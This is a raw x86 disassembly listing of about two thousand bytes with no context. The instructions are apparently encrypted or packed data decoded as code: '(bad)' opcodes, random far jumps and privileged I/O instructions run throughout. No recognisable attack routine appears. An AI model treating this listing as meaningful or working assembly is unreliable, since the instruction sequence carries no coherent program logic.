  406fab:	dec    esp
  406fac:	sbb    ebp,DWORD PTR [edx]
  406fae:	xchg   edx,eax
  406faf:	jmp    0x406fe4
  406fb1:	xor    eax,0x346ab585
  406fb6:	or     al,0xc8
  406fb8:	mov    cs,WORD PTR [edx-0x3f]
  406fbb:	jp     0x406f64
  406fbd:	cmp    eax,0x617e7a5a
  406fc2:	ficomp WORD PTR [esi+0x2161efa9]
  406fc8:	and    dl,BYTE PTR [esi-0x6f]
  406fcb:	mov    eax,0xa77fa8d4
  406fd0:	xchg   ecx,esi
  406fd2:	jo     0x406f6c
  406fd4:	pop    esi
  406fd5:	or     ebp,eax
  406fd7:	jg     0x40700b
  406fd9:	push   ecx
  406fda:	jecxz  0x407045
  406fdc:	jmp    0x695a:0xd7b4d6b
  406fe3:	test   BYTE PTR [edi+eiz*8-0xe],al
  406fe7:	dec    edi
  406fe8:	mov    ebp,0x514d855d
  406fed:	or     ch,BYTE PTR [edi]
  406fef:	inc    esi
  406ff0:	or     ch,BYTE PTR [edi-0x3ec02b1c]
  406ff6:	push   edx
  406ff7:	scas   eax,DWORD PTR es:[edi]
  406ff8:	push   edx
  406ff9:	js     0x406fc5
  406ffb:	jmp    0x406ff0
  406ffd:	test   BYTE PTR [ecx+eiz*1],dh
  407000:	mov    dh,0x2c
  407002:	mov    ah,0xa3
  407004:	or     DWORD PTR [edi],esp
  407006:	push   cs
  407007:	scas   al,BYTE PTR es:[edi]
  407008:	xchg   esp,eax
  407009:	sbb    bl,ah
  40700b:	stos   BYTE PTR es:[edi],al
  40700c:	adc    al,cl
  40700e:	jge    0x40708e
  407010:	rcr    al,0xc5
  407013:	aam    0x31
  407015:	xor    DWORD PTR [ecx],ebp
  407017:	outs   dx,DWORD PTR ds:[esi]
  407018:	mov    edx,0x6da92148
  40701d:	sub    al,0x19
  40701f:	fnstsw WORD PTR [edi]
  407021:	and    al,0x49
  407023:	xchg   edi,eax
  407024:	scas   eax,DWORD PTR es:[edi]
  407025:	xor    ebp,ebx
  407027:	adc    BYTE PTR [ecx+0x6b5d7f90],cl
  40702d:	inc    edx
  40702e:	fsubr  QWORD PTR [ebx-0x767dae8e]
  407034:	adc    BYTE PTR [ebx],0xf9
  407037:	xor    eax,0x1521fbe4
  40703c:	into   
  40703d:	add    DWORD PTR [edi],esi
  40703f:	inc    esp
  407040:	test   al,0x8c
  407042:	jp     0x40703b
  407044:	add    cl,BYTE PTR [eax+0x33]
  407047:	pop    ss
  407048:	sbb    al,0xa4
  40704a:	cmp    ebx,DWORD PTR [ebx-0x65]
  40704d:	inc    esp
  40704e:	jp     0x407056
  407050:	popf   
  407051:	jg     0x4070c6
  407053:	out    dx,eax
  407054:	daa    
  407055:	call   0x446d28e1
  40705a:	adc    ebx,DWORD PTR [ecx]
  40705c:	jl     0x407006
  40705e:	repnz dec esp
  407060:	jg     0x406fee
  407062:	xor    eax,0xee189c39
  407067:	xchg   ebx,eax
  407068:	mov    dl,BYTE PTR [ebx-0x3d]
  40706b:	mov    ds:0x7c2d8266,al
  407070:	jge    0x4070b3
  407072:	push   ebp
  407073:	inc    esp
  407074:	cmp    DWORD PTR [esi-0x291a4908],edi
  40707a:	pop    eax
  40707b:	(bad)
  407080:	aad    0x99
  407082:	sbb    DWORD PTR [edx],esi
  407084:	inc    ecx
  407085:	fsub   DWORD PTR [edx-0x5f375e7a]
  40708b:	fs into 
  40708d:	fsubr  QWORD PTR [esi+eiz*8-0x286ce678]
  407094:	enter  0x5e22,0x84
  407098:	rcl    DWORD PTR [ebx],1
  40709a:	fldcw  WORD PTR [edi+eiz*2]
  40709d:	pushf  
  40709e:	sub    BYTE PTR [ecx-0x42edc5ab],al
  4070a4:	icebp  
  4070a5:	aam    0xb
  4070a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070a8:	leave  
  4070a9:	mov    esi,0x1b9b40e8
  4070ae:	outs   dx,BYTE PTR ds:[esi]
  4070af:	ds das 
  4070b1:	mov    bh,0x8f
  4070b3:	mov    ah,0x99
  4070b5:	sti    
  4070b6:	addr16 aaa 
  4070b8:	xor    dh,bl
  4070ba:	mov    ch,0x81
  4070bc:	out    0x6b,al
  4070be:	test   eax,0xccc41379
  4070c3:	call   0x700:0x4766b422
  4070ca:	sbb    bh,cl
  4070cc:	push   cs
  4070cd:	or     edi,DWORD PTR [eax]
  4070cf:	or     ecx,DWORD PTR ds:0x726362ff
  4070d5:	ja     0x4070aa
  4070d7:	add    ebx,edi
  4070d9:	push   0xffffffd0
  4070db:	retf   0xab04
  4070de:	ficom  DWORD PTR [ebx+0x9fcca42]
  4070e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070e5:	jo     0x407085
  4070e7:	aam    0x41
  4070e9:	pop    eax
  4070ea:	adc    eax,0xc657aee7
  4070ef:	pushf  
  4070f0:	in     eax,0xb2
  4070f2:	or     al,0x9b
  4070f4:	div    DWORD PTR [eax+ecx*1-0x60]
  4070f8:	outs   dx,DWORD PTR ds:[esi]
  4070f9:	icebp  
  4070fa:	test   DWORD PTR [esi+eiz*2+0x21],ebp
  4070fe:	outs   dx,DWORD PTR ds:[esi]
  4070ff:	call   DWORD PTR [ecx+0x4680961b]
  407105:	add    cl,ah
  407107:	lahf   
  407108:	jl     0x407129
  40710a:	or     eax,esi
  40710c:	cmp    cl,cl
  40710e:	cmp    al,0x16
  407110:	std    
  407111:	in     al,0xd
  407113:	imul   edx,eax,0x5e
  407116:	or     ch,bh
  407118:	jmp    0xa12e0785
  40711d:	aad    0xd0
  40711f:	out    dx,eax
  407120:	sub    ch,BYTE PTR [ebx-0x6d]
  407123:	sub    ebx,eax
  407125:	sar    bh,0xd6
  407128:	test   DWORD PTR [eax+0x63],esi
  40712b:	pop    ecx
  40712c:	xchg   edi,eax
  40712d:	adc    ecx,DWORD PTR [ebp-0x42]
  407130:	(bad)  
  407131:	xchg   edx,eax
  407132:	pop    ebp
  407133:	hlt    
  407134:	mov    dh,BYTE PTR [edx]
  407136:	push   cs
  407137:	pop    ss
  407138:	aaa    
  407139:	jg     0x407100
  40713b:	xchg   edi,eax
  40713c:	lds    ebp,FWORD PTR ds:[ebx+0x7f]
  407140:	add    edi,DWORD PTR [edx+0x5add4b74]
  407146:	loope  0x4071a7
  407148:	push   esi
  407149:	std    
  40714a:	dec    edx
  40714b:	icebp  
  40714c:	push   eax
  40714d:	ror    DWORD PTR [edx-0x50],0x57
  407151:	mov    al,0x7b
  407153:	sub    ecx,DWORD PTR [ebx-0x107183fd]
  407159:	inc    edx
  40715a:	(bad)  
  40715b:	pop    ds
  40715c:	or     BYTE PTR ds:0xc3e43bb6,ch
  407162:	xor    esp,DWORD PTR [esi+ebx*4]
  407165:	rcr    BYTE PTR [ebp-0x62],cl
  407168:	inc    esp
  407169:	jg     0x407145
  40716b:	inc    ecx
  40716c:	fwait
  40716d:	les    ebx,FWORD PTR [eax+0x52]
  407170:	pop    eax
  407171:	push   ebp
  407172:	dec    esi
  407173:	jmp    0x4071b7
  407175:	sti    
  407176:	enter  0xaaac,0xeb
  40717a:	mov    ebp,0xd8cbe003
  40717f:	sbb    DWORD PTR [edx+0xd],0x29b6914f
  407186:	jmp    0x4c29:0x5c519702
  40718d:	fwait
  40718e:	jmp    0x4071a6
  407190:	test   esi,ebp
  407192:	bnd jbe 0x40713c
  407195:	dec    esp
  407196:	dec    DWORD PTR [edi-0x3b32dc59]
  40719c:	adc    eax,0x8a2c33ea
  4071a1:	das    
  4071a2:	popf   
  4071a3:	or     BYTE PTR [ebp+esi*8-0x18],al
  4071a7:	sbb    DWORD PTR [edx],eax
  4071a9:	(bad)
  4071ac:	lds    edx,FWORD PTR [ebx+0x72]
  4071af:	mov    BYTE PTR [esi-0x54],cl
  4071b2:	jnp    0x4071de
  4071b4:	sbb    edx,ecx
  4071b6:	jno    0x40721f
  4071b8:	test   BYTE PTR [esp+ecx*2-0x5d],bl
  4071bc:	(bad)  
  4071bd:	aas    
  4071be:	xchg   ecx,eax
  4071bf:	aas    
  4071c0:	(bad)  
  4071c1:	shl    BYTE PTR [esi+ebp*8-0x6deb9d2d],0x69
  4071c9:	aad    0xde
  4071cb:	stos   BYTE PTR es:[edi],al
  4071cc:	mov    esi,0xb2fc79c7
  4071d1:	imul   ebp,edx,0x87eef530
  4071d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071d8:	sbb    DWORD PTR [ebp+0x79],0x0
  4071dc:	mov    eax,ds:0x8c9aaa72
  4071e1:	sub    al,0x80
  4071e3:	jg     0x407179
  4071e5:	push   ds
  4071e6:	stos   DWORD PTR es:[edi],eax
  4071e7:	data16 fcomp st(6)
  4071ea:	xchg   edi,eax
  4071eb:	xchg   dh,ch
  4071ed:	jnp    0x40724c
  4071ef:	jge    0x407197
  4071f1:	push   eax
  4071f2:	adc    BYTE PTR [ebx],ch
  4071f4:	mov    edx,0x40488a8e
  4071f9:	stos   BYTE PTR es:[edi],al
  4071fa:	ja     0x40724b
  4071fc:	mov    esp,0xad1c9270
  407201:	mov    ah,0x60
  407203:	(bad)  
  407204:	ds jne 0x407266
  407207:	pop    edx
  407208:	mov    ecx,0xe85ed7d0
  40720d:	test   BYTE PTR [eax],bl
  40720f:	test   DWORD PTR [ecx+0x39],ebp
  407212:	leave  
  407213:	call   0x9c7ae0be
  407218:	popa   
  407219:	loope  0x40728c
  40721b:	scas   al,BYTE PTR es:[edi]
  40721c:	mov    edx,0x446b10ec
  407221:	cli    
  407222:	push   edx
  407223:	pop    esi
  407224:	aaa    
  407225:	fisubr DWORD PTR [ecx-0x36fd465c]
  40722b:	mov    eax,ds:0xdce2f905
  407230:	mov    esp,edi
  407232:	es nop
  407234:	and    BYTE PTR [ebp-0x14141f11],al
  40723a:	icebp  
  40723b:	(bad)  
  40723c:	arpl   WORD PTR [ecx],dx
  40723e:	sbb    BYTE PTR [ebp-0x47fb98ec],0x15
  407245:	imul   esi,DWORD PTR [ecx+0x50],0x6be21782
  40724c:	(bad)
  40724f:	sti    
  407250:	inc    edi
  407251:	sahf   
  407252:	shl    DWORD PTR [edi-0x31f6545],cl
  407258:	inc    ecx
  407259:	ins    BYTE PTR es:[edi],dx
  40725a:	lods   al,BYTE PTR ds:[esi]
  40725b:	mov    bl,0x71
  40725d:	rcl    DWORD PTR [ebx-0x1b],1
  407260:	push   ss
  407261:	inc    eax
  407262:	daa    
  407263:	push   0xe1458a03
  407268:	mov    cl,BYTE PTR [edi-0x698a220]
  40726e:	iret   
  40726f:	in     eax,dx
  407270:	sbb    cl,BYTE PTR [edx-0x66]
  407273:	fst    QWORD PTR [edi-0x69d052c8]
  407279:	ret    
  40727a:	cwde   
  40727b:	bound  edi,QWORD PTR [ebx+0x29]
  40727e:	push   ds
  40727f:	jne    0x407273
  407281:	icebp  
  407282:	dec    ebx
  407283:	cwde   
  407284:	push   edx
  407285:	xchg   edi,eax
  407286:	adc    edx,DWORD PTR [ecx-0x6329f856]
  40728c:	cli    
  40728d:	sub    al,0x16
  40728f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407290:	xchg   esi,eax
  407291:	popf   
  407292:	pusha  
  407293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407294:	sbb    eax,ebx
  407296:	sti    
  407297:	jecxz  0x407292
  407299:	inc    esi
  40729a:	sar    BYTE PTR [edx+ebp*1],0x88
  40729e:	jns    0x4072e4
  4072a0:	inc    eax
  4072a1:	ins    BYTE PTR es:[edi],dx
  4072a2:	test   eax,0x362aa1da
  4072a7:	inc    ebx
  4072a8:	xchg   edi,eax
  4072a9:	jecxz  0x4072da
  4072ab:	out    0xfb,al
  4072ad:	push   0x86d27af7
  4072b2:	pop    es
  4072b3:	(bad)  
  4072b4:	cmp    eax,DWORD PTR [ebx]
  4072b6:	add    ebx,DWORD PTR [ebp+0x97c27ab]
  4072bc:	mov    ebp,0x81edaa4d
  4072c1:	test   BYTE PTR [edi],ah
  4072c3:	and    ch,BYTE PTR [edi+0x7b17dcad]
  4072c9:	pop    edi
  4072ca:	out    0x0,al
  4072cc:	sub    bh,BYTE PTR [edx+edi*4-0x3d]
  4072d0:	add    BYTE PTR [ecx+0x5eb348db],0x59
  4072d7:	test   al,0xa
  4072d9:	adc    dh,BYTE PTR [ecx]
  4072db:	loope  0x407261
  4072dd:	ja     0x40725f
  4072df:	mov    cl,0xd7
  4072e1:	jg     0x4072eb
  4072e3:	test   eax,edx
  4072e5:	mov    bh,0x53
  4072e7:	inc    esp
  4072e8:	call   0x4cfd:0x53344495
  4072ef:	das    
  4072f0:	repnz mov eax,ds:0x8fb02602
  4072f6:	(bad)  
  4072f7:	ss je  0x40734f
  4072fa:	leave  
  4072fb:	je     0x4072a6
  4072fd:	cmp    BYTE PTR [edi+0x3226eca4],0xa4
  407304:	xchg   esi,eax
  407305:	adc    dl,al
  407307:	and    eax,0x5dc09743
  40730c:	(bad)  
  40730d:	out    0x1b,al
  40730f:	xchg   DWORD PTR [esi],edi
  407311:	xor    al,0x3b
  407313:	out    0xc9,al
  407315:	add    BYTE PTR [ebp+0x52e60cbc],ch
  40731b:	into   
  40731c:	cmp    al,0x7c
  40731e:	pop    esi
  40731f:	mov    dh,BYTE PTR [ecx+0x25]
  407322:	fwait
  407323:	rcl    BYTE PTR [ebx+0x30b94a21],1
  407329:	fst    DWORD PTR [ebp+eiz*8-0x3a537e1c]
  407330:	jnp    0x40737a
  407332:	fcom   QWORD PTR [edi+0x771fb3a1]
  407338:	and    ebp,edi
  40733a:	repz loopne 0x40739d
  40733d:	retf   0x39de
  407340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407341:	pop    es
  407342:	push   eax
  407343:	clc    
  407344:	xor    al,0xa6
  407346:	xor    esi,ebp
  407348:	daa    
  407349:	cld    
  40734a:	rcl    BYTE PTR [ebx-0x39fbcae3],cl
  407350:	js     0x4073be
  407352:	sub    al,0x55
  407354:	cmc    
  407355:	jae    0x40730a
  407357:	xlat   BYTE PTR ds:[ebx]
  407358:	jl     0x40736f
  40735a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40735b:	in     eax,0x78
  40735d:	adc    DWORD PTR [edx],esp
  40735f:	mov    ebp,0x248414c5
  407364:	jno    0x407310
  407366:	pop    edx
  407367:	mov    dh,0x89
  407369:	cmp    esp,0x6
  40736c:	inc    edi
  40736d:	aaa    
  40736e:	loopne 0x407334
  407370:	stos   DWORD PTR es:[edi],eax
  407371:	sub    al,BYTE PTR [eax+0x4eec1ca]
  407377:	(bad)  
  407379:	loop   0x40731a
  40737b:	test   eax,0x58cce21b
  407380:	test   esi,ebp
  407382:	(bad)  
  407383:	(bad)  
  407384:	xchg   ebp,eax
  407385:	iret   
  407386:	loope  0x4073a0
  407388:	in     al,0x14
  40738a:	pusha  
  40738b:	xchg   esp,eax
  40738c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40738e:	mov    edi,0x652432c1
  407393:	xor    ebp,ebx
  407395:	sbb    cl,BYTE PTR [eax]
  407397:	add    DWORD PTR [eax-0x41],ebp
  40739a:	aas    
  40739b:	jae    0x407370
  40739d:	mov    ds:0xc4cb7574,eax
  4073a2:	(bad)  
  4073a3:	fld    QWORD PTR [ecx+0x62b9bd85]
  4073a9:	ds mov dl,0xd3
  4073ac:	jae    0x40737b
  4073ae:	jnp    0x407371
  4073b0:	xor    BYTE PTR [esi],0x6d
  4073b3:	mov    ss,WORD PTR [edi+0x128454ea]
  4073b9:	test   eax,0x8e8b401c
  4073be:	dec    ebp
  4073bf:	bnd jnp 0x407371
  4073c2:	cld    
  4073c3:	je     0x407417
  4073c5:	mov    edx,0x5d06c330
  4073ca:	or     ch,BYTE PTR [ecx-0x6e]
  4073cd:	xchg   ebp,eax
  4073ce:	outs   dx,DWORD PTR ds:[esi]
  4073cf:	aad    0x4d
  4073d1:	test   al,0x3c
  4073d3:	retf   
  4073d4:	je     0x4073b9
  4073d6:	mov    eax,DWORD PTR [esi]
  4073d8:	jecxz  0x407453
  4073da:	or     ch,BYTE PTR [edx-0x36ed8da4]
  4073e0:	test   eax,0x74a4702c
  4073e5:	hlt    
  4073e6:	xchg   ecx,eax
  4073e7:	in     al,dx
  4073e8:	cli    
  4073e9:	sbb    ah,ah
  4073eb:	je     0x407453
  4073ed:	call   0x86e7:0x63cdc36f
  4073f4:	and    ah,ah
  4073f6:	dec    edi
  4073f7:	dec    eax
  4073f8:	jecxz  0x40739a
  4073fa:	push   eax
  4073fb:	adc    al,0x32
  4073fd:	mov    al,0x50
  4073ff:	and    esi,DWORD PTR [ebx-0xe61256]
  407405:	aad    0x13
  407407:	pop    ds
  407408:	div    DWORD PTR [eax-0x84ed2c7]
  40740e:	xchg   ebp,eax
  40740f:	cmp    dl,BYTE PTR [ebx+edi*8+0x144ccc84]
  407416:	in     al,dx
  407417:	(bad)  
  407418:	xchg   ecx,eax
  407419:	fucomip st,st(4)
  40741b:	or     BYTE PTR ds:0xe8728ec6,cl
  407421:	fadd   DWORD PTR [edi-0x144053]
  407427:	sub    ah,BYTE PTR [esi+esi*4-0x46857138]
  40742e:	push   edi
  40742f:	into   
  407430:	jle    0x407427
  407432:	(bad)  
  407434:	inc    ecx
  407435:	lea    edx,[edi-0x3c]
  407438:	mov    dl,0x35
  40743a:	inc    ebx
  40743b:	popf   
  40743c:	mov    ds:0x34d0fa37,eax
  407441:	fnsave [ecx+0x23]
  407444:	mov    edx,DWORD PTR [edi+ebp*8+0x40820e73]
  40744b:	mov    ah,0xab
  40744d:	jno    0x4073d8
  40744f:	inc    ecx
  407450:	jnp    0x407428
  407452:	xor    BYTE PTR [ebx+0x4f],ch
  407455:	add    edi,DWORD PTR [edi+ebx*2+0x6a02707e]
  40745c:	lods   eax,DWORD PTR ds:[esi]
  40745d:	nop
  40745e:	xchg   ecx,eax
  40745f:	scas   eax,DWORD PTR es:[edi]
  407460:	cmp    eax,0x4f247e37
  407466:	cmp    edi,DWORD PTR [ebx+ebp*8]
  407469:	(bad)  
  40746a:	jno    0x40744d
  40746c:	sub    eax,0xcf7826d5
  407471:	mov    eax,0xc69900e7
  407476:	mov    ds,WORD PTR ds:0x6611c139
  40747c:	popa   
  40747d:	lea    edi,[edx-0x1bab4a12]
  407483:	dec    ecx
  407484:	fadd   DWORD PTR [ebx+0xb2d8843]
  40748a:	adc    eax,0xd3688946
  40748f:	ins    DWORD PTR es:[edi],dx
  407490:	mov    dl,0xc7
  407492:	test   BYTE PTR [eax],bl
  407494:	push   ecx
  407495:	pusha  
  407496:	jmp    0x7b75a2a
  40749b:	mov    dh,0x3f
  40749d:	daa    
  40749e:	mov    dl,0xef
  4074a0:	leave  
  4074a1:	mov    edi,0x11183850
  4074a6:	sbb    eax,ebp
  4074a8:	(bad)  
  4074a9:	xchg   ecx,eax
  4074aa:	int    0xd2
  4074ac:	push   ecx
  4074ad:	out    dx,eax
  4074ae:	mov    eax,0xa6f42975
  4074b3:	add    BYTE PTR [esi],bl
  4074b5:	dec    esi
  4074b6:	sahf   
  4074b7:	cmp    edi,DWORD PTR [edi-0x4b3e1136]
  4074bd:	pop    ss
  4074be:	lds    ebp,FWORD PTR [edx]
  4074c0:	lea    eax,[ebx-0x659fb22a]
  4074c6:	sub    eax,0x1add806a
  4074cb:	dec    edx
  4074cc:	lods   eax,DWORD PTR ds:[esi]
  4074cd:	mov    ah,0xb1
  4074cf:	push   0x6c96dab0
  4074d4:	lds    edx,FWORD PTR [eax-0x4b]
  4074d7:	inc    esp
  4074d8:	retf   0xda94
  4074db:	shr    BYTE PTR [ecx-0xf],0xb3
  4074df:	sub    al,0x5d
  4074e1:	inc    esi
  4074e2:	push   esp
  4074e3:	push   cs
  4074e4:	(bad)  
  4074e5:	xlat   BYTE PTR ds:[ebx]
  4074e6:	lods   al,BYTE PTR ds:[esi]
  4074e7:	rcr    DWORD PTR [eax],1
  4074e9:	in     eax,0xe
  4074eb:	enter  0xedad,0xe
  4074ef:	push   ecx
  4074f0:	(bad)
  4074f5:	jge    0x4074e2
  4074f7:	hlt    
  4074f8:	inc    ebx
  4074f9:	adc    al,0x1
  4074fb:	ret    0x992d
  4074fe:	(bad)  
  4074ff:	loop   0x4074a6
  407501:	scas   eax,DWORD PTR es:[edi]
  407502:	push   ecx
  407503:	call   FWORD PTR [ebx+0x18]
  407506:	cmc    
  407507:	push   ecx
  407508:	jnp    0x407509
  40750a:	and    eax,DWORD PTR [eax+0x3c]
  40750d:	dec    ebp
  40750e:	jbe    0x407530
  407510:	cmp    BYTE PTR [edi],dh
  407512:	cmp    eax,0x53b00adb
  407517:	cmp    bh,BYTE PTR [edx]
  407519:	jo     0x4074bd
  40751b:	retf   
  40751c:	fwait
  40751d:	jmp    0x4618:0xb171773b
  407524:	push   esp
  407525:	scas   eax,DWORD PTR es:[edi]
  407526:	cmp    BYTE PTR [ecx-0x71],al
  407529:	daa    
  40752a:	bound  eax,QWORD PTR [ebp+ecx*4-0x3654281e]
  407531:	sub    esp,edi
  407533:	push   es
  407534:	imul   esi,DWORD PTR [eax-0x62],0xffffffb7
  407538:	fdiv   st(5),st
  40753a:	(bad)  
  40753b:	data16 cmp ah,0xac
  40753f:	les    ebx,FWORD PTR [bp+di-0x67]
  407543:	sbb    dl,BYTE PTR [ecx+0x884feb9]
  407549:	push   esp
  40754a:	into   
  40754b:	xchg   esp,eax
  40754c:	cmp    BYTE PTR [edi],cl
  40754e:	cmp    BYTE PTR [esi],dl
  407550:	jmp    0x822d:0x5166f129
  407557:	std    
  407558:	xchg   edx,eax
  407559:	nop
  40755a:	loopne 0x407545
  40755c:	xor    BYTE PTR [edx-0x46a0b88f],0xab
  407563:	jae    0x4075dd
  407565:	ficomp DWORD PTR [esi+0x2b4c1940]
  40756b:	retf   0xedeb
  40756e:	loopne 0x407508
  407570:	mov    dh,0xf4
  407572:	retf   
  407573:	sbb    bh,BYTE PTR [ebx-0x10]
  407576:	add    bl,BYTE PTR [edi+0x195d686f]
  40757c:	mov    bl,0xe2
  40757e:	sbb    edx,ebp
  407580:	xchg   ebx,eax
  407581:	add    eax,0xb037d4e7
  407586:	inc    edx
  407587:	or     al,0x5
  407589:	cli    
  40758a:	dec    ebx
  40758b:	aas    
  40758c:	stc    
  40758d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40758e:	es into 
  407590:	mov    dh,0x64
  407592:	push   esi
  407593:	sbb    ah,ch
  407595:	mov    esi,gs
  407597:	ins    BYTE PTR es:[edi],dx
  407598:	pop    edi
  407599:	(bad)  
  40759a:	pop    ecx
  40759b:	mov    esi,0x4d15cbc8
  4075a0:	dec    ebx
  4075a1:	jns    0x4075a6
  4075a3:	mul    BYTE PTR [ebx]
  4075a5:	fst    DWORD PTR [edx-0x5c]
  4075a8:	(bad)
  4075ab:	jbe    0x407594
  4075ad:	mov    eax,DWORD PTR [ebp-0x68]
  4075b0:	push   es
  4075b1:	cmp    BYTE PTR [ecx],bl
  4075b3:	pop    es
  4075b4:	clc    
  4075b5:	pop    esp
  4075b6:	(bad)  
  4075b7:	xchg   ebx,eax
  4075b8:	xchg   BYTE PTR [eax-0x79],bh
  4075bb:	imul   ebp,DWORD PTR [ebx+edx*4],0xffffffff
  4075bf:	das    
  4075c0:	and    eax,0x52af9ba3
  4075c5:	jl     0x407630
  4075c7:	push   edx
  4075c8:	pop    edx
  4075c9:	cmp    DWORD PTR ds:0x3a17932a,0x7b550b02
  4075d3:	mov    esp,0xad0b164d
  4075d8:	mov    dl,0x5e
  4075da:	fdivr  st,st(7)
  4075dc:	aaa    
  4075dd:	aas    
  4075de:	sti    
  4075df:	mov    al,ds:0x72f3e4fc
  4075e4:	(bad)  
  4075e5:	mov    dl,0x14
  4075e7:	adc    al,0xb0
  4075e9:	sbb    eax,0x25f97b87
  4075ee:	loopne 0x40758e
  4075f0:	jbe    0x407620
  4075f2:	shr    BYTE PTR [ebx],0xf5
  4075f5:	mov    ah,0x4c
  4075f7:	jl     0x407673
  4075f9:	aad    0x6c
  4075fb:	das    
  4075fc:	inc    ecx
  4075fd:	push   es
  4075fe:	pushf  
  4075ff:	test   al,0xc4
  407601:	sahf   
  407602:	aad    0x8d
  407604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407605:	and    bl,BYTE PTR [ecx+ecx*2]
  407608:	out    dx,al
  407609:	dec    ebx
  40760a:	xlat   BYTE PTR ds:[ebx]
  40760b:	push   ecx
  40760c:	adc    eax,0x2df5c975
  407611:	mov    ah,0x7e
  407613:	rcl    eax,cl
  407615:	lds    esi,FWORD PTR [edi]
  407617:	das    
  407618:	not    DWORD PTR ss:0x1aae55a4
  40761f:	cmp    al,0xd5
  407621:	adc    al,0x2f
  407623:	(bad)  
  407624:	shr    DWORD PTR [esi-0x79291fef],cl
  40762a:	dec    ebp
  40762b:	nop
  40762c:	mov    esi,0x84acaf29
  407631:	call   0x1f67:0xa873c754
  407638:	sub    al,0xe9
  40763a:	cmp    al,0x88
  40763c:	test   BYTE PTR [ebp+0x7c],ch
  40763f:	adc    DWORD PTR [edx+0x49],eax
  407642:	fadd   DWORD PTR [esi+0x56ebbd16]
  407648:	mov    ch,0x67
  40764a:	sbb    DWORD PTR [ecx],edi
  40764c:	icebp  
  40764d:	mov    ds:0x34cd6c3d,eax
  407652:	ins    DWORD PTR es:[edi],dx
  407653:	out    dx,eax
  407654:	adc    al,0x7a
  407656:	stos   DWORD PTR es:[edi],eax
  407657:	popa   
  407658:	push   edx
  407659:	(bad)  
  40765a:	pop    ebp
  40765b:	mov    edi,DWORD PTR [ecx+0x68cf2f5b]
  407661:	js     0x407689
  407663:	cmp    DWORD PTR [ebx+ecx*2-0xb],edi
  407667:	ret    
  407668:	jg     0x4075f3
  40766a:	scas   eax,DWORD PTR es:[edi]
  40766b:	imul   eax,ecx,0xefd9b23e
  407671:	dec    ebp
  407672:	xchg   ecx,eax
  407673:	jno    0x40761a
  407675:	inc    eax
  407676:	test   al,0x58
  407678:	outs   dx,BYTE PTR ds:[esi]
  407679:	(bad)  
  40767a:	jge    0x407616
  40767c:	fiadd  DWORD PTR [esp+eax*1]
  40767f:	pop    ebx
  407680:	das    
  407681:	pop    es
  407682:	rol    DWORD PTR [ecx+0x5564d3a8],0x29
  407689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40768a:	pop    ds
  40768b:	into   
  40768c:	loope  0x40770b
  40768e:	mov    ebp,0x90aeae3d
  407693:	mov    al,0xe6
  407695:	mov    ecx,0xa48eca26
  40769a:	(bad)  
  40769b:	std    
  40769c:	js     0x40770d
  40769e:	scas   eax,DWORD PTR es:[edi]
  40769f:	hlt    
  4076a0:	push   0xfffffff7
  4076a2:	push   es
  4076a3:	popa   
  4076a4:	xor    edi,0x458ff50f
  4076aa:	mov    ds:0x21b121,eax
  4076af:	loope  0x4076b2
  4076b1:	or     ch,BYTE PTR ds:0xe918d8c0
  4076b7:	sub    DWORD PTR [ecx-0x49],ebx
  4076ba:	nop
  4076bb:	enter  0x297a,0xa8
  4076bf:	mov    bl,0xe4
  4076c1:	push   esi
  4076c2:	xor    dl,al
  4076c4:	ins    DWORD PTR es:[edi],dx
  4076c5:	mov    bh,0x4
  4076c7:	sbb    ah,BYTE PTR [esi+0xc1e823e]
  4076cd:	mov    dh,0x1
  4076cf:	out    dx,al
  4076d0:	xchg   esp,eax
  4076d1:	xor    eax,0xb62f7797
  4076d6:	pop    ss
  4076d7:	xor    BYTE PTR [edx-0x1c],0x7f
  4076db:	(bad)  [eax+0x2]
  4076de:	xor    DWORD PTR [edx+0x2e006655],ebp
  4076e4:	push   esi
  4076e5:	leave  
  4076e6:	pop    ebx
  4076e7:	push   es
  4076e8:	mov    bh,0x96
  4076ea:	(bad)  
  4076eb:	aas    
  4076ec:	push   eax
  4076ed:	adc    dl,dl
  4076ef:	mov    BYTE PTR [ecx],cl
  4076f1:	dec    esi
  4076f2:	push   ebp
  4076f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076f4:	jmp    0x2dff8808
  4076f9:	pop    esi
  4076fa:	adc    al,0x4e
  4076fc:	stos   BYTE PTR es:[edi],al
  4076fd:	(bad)  
  4076fe:	jmp    DWORD PTR [edi]
  407700:	mov    ebp,0x7b425be3
  407705:	push   esi
  407706:	push   edx
  407707:	mov    esi,0x280fb6e9
  40770c:	mov    ebx,0x32237f3c
  407711:	clc    
  407712:	outs   dx,DWORD PTR ds:[esi]
  407713:	mov    ds:0xa6dc649b,eax
  407718:	mov    esp,0x67253023
  40771d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40771e:	hlt    
  40771f:	xor    bl,BYTE PTR [ecx]
  407721:	and    BYTE PTR [edx],ah
  407723:	imul   edi,DWORD PTR [ebp-0x71],0x3f
  407727:	cld    
  407728:	sub    ah,BYTE PTR [eax]
  40772a:	ds mov bl,0x6e
  40772d:	push   eax
  40772e:	mov    eax,ds:0xe1d123cb
  407733:	icebp  
  407734:	ds aam 0x17
  407737:	cdq    
  407738:	jecxz  0x407706
  40773a:	push   ebx
  40773b:	pop    edi
  40773c:	add    bh,dh
  40773e:	fidiv  WORD PTR [ecx]
  407740:	push   ebx
  407741:	push   ebx
  407742:	lods   al,BYTE PTR ds:[esi]
  407743:	cdq    
  407744:	fidiv  WORD PTR [edx+0xef46a72]
  40774a:	scas   eax,DWORD PTR es:[edi]
  40774b:	js     0x407779
  40774d:	push   ss
  40774e:	stc    
  40774f:	call   0xf2613649
  407754:	adc    al,0x9c
  407756:	mov    ds:0xd5a8303,eax
  40775b:	fs inc edi
  40775d:	fnstenv [edi-0x2869d340]
  407763:	lods   eax,DWORD PTR ds:[esi]
  407764:	test   ax,0xcaaa
